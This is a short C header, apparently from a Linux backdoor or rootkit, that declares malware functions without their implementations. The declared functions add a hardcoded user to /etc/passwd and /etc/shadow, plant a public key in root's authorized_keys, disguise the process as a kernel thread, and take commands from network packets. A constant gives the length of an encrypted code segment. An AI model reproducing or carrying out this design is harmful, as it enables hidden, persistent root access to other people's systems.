#ifndef SENSITIVE_INCLUDE
#define SENSITIVE_INCLUDE

/* Length in bytes of .text segment to encrypt */
#define SENSITIVE_LEN 0x59b

// Helper function to append a line (string) to a file
int add_file_line(const char *, const char *);
// Add hardcoded user to /etc/passwd
int add_user_passwd(void);
// Add hardcoded user to /etc/shadow
int add_user_shadow(void);
// Add public key to root user's authorized_keys file
int add_root_pubkey(void);
// The kernel thread identifer
char *proc_name(void);
// Fetch command from packet
struct command *get_command(unsigned char *, size_t);
// Free command object
void free_command(struct command *);

// Check whether command object holds a valid request
int is_add_user(struct command *);
int is_add_pubkey(struct command *);

#endif
